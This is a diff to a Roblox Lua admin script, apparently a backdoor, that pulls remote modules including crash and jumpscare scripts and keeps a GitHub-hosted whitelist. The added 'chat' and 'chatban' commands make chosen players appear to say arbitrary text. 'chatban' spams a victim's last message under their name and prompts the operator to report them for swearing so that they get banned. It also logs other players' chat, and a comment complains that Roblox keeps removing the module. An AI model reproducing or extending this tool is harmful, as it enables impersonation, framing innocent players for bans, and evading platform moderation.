@@ -1,8 +1,12 @@
+-- copy anything you want from here i dont care --
+-- this was all made by cxo --
+
 local cxoURL = "https://raw.githubusercontent.com/pcxo/whitelisted/main/users"
 local prefix = "/"
 local cmds = {}
 local banned = {}
 local countries = {}
+local chats = {}
 
 -- Thanks roblox for taking down my module every time i upload this script --
 
@@ -46,6 +50,7 @@ require(125333857991494).load() -- orb script
 require(139263854632403).load() -- gmod gun script
 require(78411881489123) -- crash script
 require(118393455763822) -- jumpscare script
+require(97248613655645).Run() -- chat script (Credit to palamode)
 
 repeat task.wait() until game:GetService("ReplicatedStorage"):FindFirstChild("RemoteScript")
 repeat task.wait() until game:GetService("ReplicatedStorage"):FindFirstChild("OrbScript")
@@ -80,9 +85,13 @@ local BackupIDs = {
 	1889958;
 	-- decryptionite
 	120983992;
-	1921860822; 
-	366631664; 
+	1921860822;
+	366631664;
 	13425405;
+	-- palamode
+	523322320;
+	-- freddie
+	1724769699;
 }
 
 function GetWhitelist()
@@ -741,6 +750,76 @@ addcmd({
 })
 
 addcmd({
+	Name = "chat",
+	Aliases = {},
+	Function = function(sender, targets, arguments)
+		local msg = table.concat(arguments, " ", 2)
+		for i, plr in ipairs(targets) do
+			_G.sudo(plr.Name, msg , "all")
+		end
+	end
+})
+
+addcmd({
+	Name = "chatban",
+	Aliases = {},
+	Function = function(sender, targets, arguments)
+		for i, plr in ipairs(targets) do
+			
+			if not _G.sudo then
+				notfi(sender, "cxo's admin", "Critical error! _G.sudo is not found, inserting..")
+				local success, fail = pcall(function()
+					require(97248613655645).Run()
+				end)
+				task.spawn(function()
+					task.wait(5)
+					if not success then
+						notfi(sender, "cxo's admin", "Failed to insert _G.sudo: " .. fail)
+						return
+					else
+						notfi(sender, "cxo's admin", "_G.sudo has been inserted.", 2)
+					end
+				end)
+			else
+				local latest
+				local banning = true
+				for c = #chats, 1, -1 do
+					if string.find(chats[c], plr.Name ..":") then
+						latest = chats[c]
+						print(latest)
+						break
+					end
+				end
+				if latest then
+					local remove = plr.Name .. ":"
+					local banstring = latest:gsub(remove, "", 1)
+					
+					local co = coroutine.create(function()
+						repeat
+							task.wait(0.3)
+							_G.sudo(plr.Name, banstring, "all")
+						until banning == false or not game.Players:FindFirstChild(plr.Name)
+					end)
+					
+					coroutine.resume(co)
+					
+					coroutine.wrap(function()
+						notfi(sender, "cxo's admin", "Report ".. plr.Name .." for swearing to ban them!")
+						task.wait(10)
+						banning = false
+						coroutine.yield(co)
+					end)()
+					
+				else
+					notfi(sender.Name, "cxo's admin", plr.Name .." Hasn't spoke yet! wait for them to chat then use this command.")
+				end
+			end
+			
+		end
+	end
+})
+
+addcmd({
 	Name = "unload",
 	Aliases = {},
 	Function = function(sender, targets, arguments)
@@ -801,6 +880,9 @@ for i,v in pairs(game.Players:GetPlayers()) do
 		notfi(v, "cxo's admin", "You are whitelisted! prefix is ".. prefix)
 	end
 	v.Chatted:Connect(function(msg)
+		if not table.find(Whitelist, player.Name) then
+			table.insert(chats, player.Name ..":" .. msg)
+		end
 		if table.find(Whitelist, tostring(v.UserId)) then
 
 			if msg:sub(1, #prefix) == prefix then
@@ -843,6 +925,9 @@ game.Players.PlayerAdded:Connect(function(player)
 		notfi(player, "cxo's admin", "You are whitelisted! prefix is ".. prefix)
 	end
 	player.Chatted:Connect(function(msg)
+		if not table.find(Whitelist, player.Name) then
+			table.insert(chats, player.Name ..":" .. msg)
+		end
 		if table.find(Whitelist, tostring(player.UserId)) then
 			if msg:sub(1, #prefix) == prefix then
 				msg = msg:sub(#prefix + 1)
